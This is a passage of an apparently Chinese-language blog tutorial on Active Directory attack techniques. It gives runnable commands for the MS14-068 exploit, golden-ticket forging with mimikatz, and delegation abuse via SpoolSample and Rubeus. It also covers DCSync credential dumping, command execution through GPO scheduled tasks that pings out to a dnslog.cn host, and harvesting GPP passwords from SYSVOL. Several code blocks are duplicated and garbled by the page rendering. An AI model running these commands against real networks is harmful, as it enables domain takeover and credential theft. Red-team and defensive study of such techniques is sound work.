+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell">ms14-068.exe -u test3@superman.com -p Test#123 -s S-1-5-21-2030659959-700672918-1434258406-1113 -d win08.superman.com<br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">ms14-068.exe -u test3@superman.com -p Test#123 -s S-1-5-21-2030659959-700672918-1434258406-1113 -d win08.superman.com<br><span class="hljs-meta">#</span><span class="bash"> 将生成的票据导入mimikatz</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="增强的黄金票据"><a href="#增强的黄金票据" class="headerlink" title="增强的黄金票据"></a>增强的黄金票据</h2><p>普通的金票不能跨域使用，而增强的黄金票据是，如果知道<strong>根域</strong>的<code>SID</code>那么就可以通过<strong>子域</strong>的<code>KRBTGT</code>的<code>HASH</code>值，使用<code>mimikatz</code>创建具有<code>EnterpriseAdmins</code>组权限（域林中的最高权限）的票据</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::golden /admin:administrator /domain:news.rootkit.org` /sid:子域sid /sids:根域sids /krbtgt:子域krbtgt的hash /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;</span> <span class="hljs-keyword"><code class="language-hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::golden /admin:administrator /domain:news.rootkit.org` /sid:子域sid /sids:根域sids /krbtgt:子域krbtgt的hash /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></p>
+<p><code>Startoffffset</code>和<code>endin</code>分别代表偏移量和长度，<code>renewmax</code>表示生成的票据的最长时间。</p>
+</blockquote>
+<p>然后就可以通过<code>dir</code>访问<code>OWA2013.test.com</code>的共享文件夹，此时的这个票据是拥有整个域林的控制权的。</p>
+<h2 id="钻石票"><a href="#钻石票" class="headerlink" title="钻石票"></a>钻石票</h2><p><a target="_blank" rel="noopener" href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/</a></p>
+<h1 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h1><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了。</p>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816160012354.png" alt="image-20220816160012354" style="zoom:50%;">
+
+<p>攻击利用，当设置非约束委派的机器被拿下后，诱导管理员主动过来访问可以拿到域管的票据，这种比较鸡肋。另一个经典的场景是使用打印机的Bug强制用户来访问。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用域管去登陆这台机器</span><br>└─# python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4  test.com/manager@192.168.181.131<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 在委派的机器上直接导出票据</span><br>privilege::debug <br>sekurlsa::tickets /export<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用域管去登陆这台机器</span><br>└─# python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4  test.com/manager@192.168.181.131<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 在委派的机器上直接导出票据</span><br>privilege::debug <br>sekurlsa::tickets /export<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 注入票据</span><br>kerberos::ptt [0;1622d8]-2-0-60a00000-manager@krbtgt-TEST.COM.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><strong>非约束委派+Spooler打印机服务</strong></p>
+<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre class=" language-hljs shell">SpoolSample.exe dm2012 win10<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="hljs-meta">#</span><span class="bash"> 每隔一秒监听一次来自dm2012的登陆（需要本地管理员权限）</span><br>Rubeus.exe monitor /interval:1 /filteruser:dm2012$<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">注：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，Rubeus可以直接将base64编码的票据直接注入到内存中</span><br>Rubeus.exe ptt /ticket:base64<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">SpoolSample.exe dm2012 win10<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="hljs-meta">#</span><span class="bash"> 每隔一秒监听一次来自dm2012的登陆（需要本地管理员权限）</span><br>Rubeus.exe monitor /interval:1 /filteruser:dm2012$<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">注：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，Rubeus可以直接将base64编码的票据直接注入到内存中</span><br>Rubeus.exe ptt /ticket:base64<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 因为我们Rubeus监听TGT用不了，所以我们可以用mimikatz导出TGT</span><br>privilege::debug<br>sekurlsa::tickets /export<br><br></code></pre></td></tr></table></figure>
+
+<p>得到票据后：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi<br><br>lsadump::dcsync /domain:test.local /all /csv<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="约束委派-1"><a href="#约束委派-1" class="headerlink" title="约束委派"></a>约束委派</h2><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
+<p>利用点在被配置了约束委派的用户，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p>
+<h1 id="DACL-滥用"><a href="#DACL-滥用" class="headerlink" title="DACL 滥用"></a>DACL 滥用</h1><p>Active Directory域服务中资源的访问权限通常是由访问控制条目（ACE）控制。访问控制条目描述 Active Directory 中的主体（例如用户、计算机帐户）对安全对象（用户、组、计算机、容器、组织单位 (OU)、GPO 等）的允许和拒绝权限。</p>
+<p>DACL（Active Directory 自由访问控制列表）是由 ACE（访问控制条目）组成的列表，用于标识允许或拒绝访问对象的用户和组。SACL（系统访问控制列表）定义了对安全对象的审计和监控规则。</p>
+<blockquote>
+<p>Access Mask在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。</p>
+<p>TrusteesTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。</p>
+</blockquote>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816182755113.png" alt="image-20220816182755113" style="zoom:50%;">
+
+<p>如果配置错误，ACE 可能会被滥用以在 AD 域内进行横向移动或权限提升。</p>
+<p>AD域里常见可利用的ACL</p>
+<ul>
+<li>GenericAll ：拥有一个可以完全控制用户/组的权限</li>
+<li>GenericWrite ：此权限能够更新目标对象的属性值</li>
+<li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li>
+<li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li>
+<li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li>
+<li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</li>
+</ul>
+<p>思维导图：</p>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/DACL abuse.png" alt="DACL abuse" style="zoom:100%;">
+
+<blockquote>
+<p>bloodhoud</p>
+<p>powervie</p>
+</blockquote>
+<p>使用bloodhoud查找这些可利用的ACL:</p>
+<p>使用 Active Directory Explorer导出域信息到bloodhoud</p>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190736641.png" alt="image-20220816190736641"><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190811255.png" alt="image-20220816190811255" style="zoom:50%;"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用ADExplorerSnapshot.py将dat文件解析为BloodHound可解析的格式。</span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用ADExplorerSnapshot.py将dat文件解析为BloodHound可解析的格式。</span><br><span class="hljs-meta">#</span><span class="bash"> 项目地址：https://github.com/c3c/ADExplorerSnapshot.py</span><br>python3 ADExplorerSnapshot.py result.dat -o result<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h2 id="GPO组策略对象执行计划任务"><a href="#GPO组策略对象执行计划任务" class="headerlink" title="GPO组策略对象执行计划任务"></a>GPO组策略对象执行计划任务</h2><p>利用组策略的计划任务实现命令执行，在目标不出网的情况下，可以批量帮助我们找到域内出网的机器，并且能帮助我们实现指定OU批量上线。</p>
+<blockquote>
+<p>在拿到域控权限后，可以利用组策略实现命令执行。有几个作用，第一当目标不出网时可以寻找出网机器，第二可以对指定OU(如运维部)命令执行上线，来找寻靶标！</p>
+</blockquote>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816191743293.png" alt="image-20220816191743293" style="zoom: 50%;">
+
+
+
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192037416.png" alt="image-20220816192037416" style="zoom:50%;">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 执行命令</span><br>c:\windows\system32\cmd.exe /c for /F %X in (&#x27;hostname&#x27;) do ping %X.lsd1yc.dnslog.cn<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192300725.png" alt="image-20220816192300725" style="zoom:50%;">
+
+<p>回车确定添加计划任务。</p>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192559974.png" alt="image-20220816192559974"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">gpupdate /force<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="GPP组策略首选项"><a href="#GPP组策略首选项" class="headerlink" title="GPP组策略首选项"></a>GPP组策略首选项</h2><p>Windows 2008 Server引入了一项称为组策略首选项（Group Policy Preferences）的新功能，该功能使管理员可以部署影响域中计算机/用户的特定配置。管理员可以通过在组策略首选项中一键给域中计算机下发策略，其策略信息如组策略数据、域数据存储在SYSVOL文件夹中，域用户都可以访问该文件夹。若通过组策略修改域内机器管理员密码，其密文信息会保存在SYSVOL文件夹内。攻击者如果获取了该密码信息就可以破解，相当于就获取到了管理员密码</p>
+<p>利用条件：</p>
+<blockquote>
+<p> win &lt; = 2008r2或没有打 KB2962486补丁</p>
+<p>需要个域账号</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs shell">dir \\域控ip\sysvol\域名\Policies<br>type \\域控ip\sysvol\域名\Policies\&#123;ID值&#125;\Machine\Preferences\Groups\Groups.xml<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">dir \\域控ip\sysvol\域名\Policies<br>type \\域控ip\sysvol\域名\Policies\&#123;ID值&#125;\Machine\Preferences\Groups\Groups.xml<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 需要个域账号</span><br>dir \\192.168.181.130\sysvol\test.com\Policies<br></code></pre></td></tr></table></figure>
+
+<h1 id="域权限维持"><a href="#域权限维持" class="headerlink" title="域权限维持"></a>域权限维持</h1><p>DSRM 持久性 </p>
+<h1 id="监听欺骗"><a href="#监听欺骗" class="headerlink" title="监听欺骗"></a>监听欺骗</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1813506">https://cloud.tencent.com/developer/article/1813506</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7217#toc-9">https://xz.aliyun.com/t/7217#toc-9</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/">https://www.geekby.site/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/ad-cs">https://www.thehacker.recipes/ad/movement/ad-cs</a></p>
+</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>
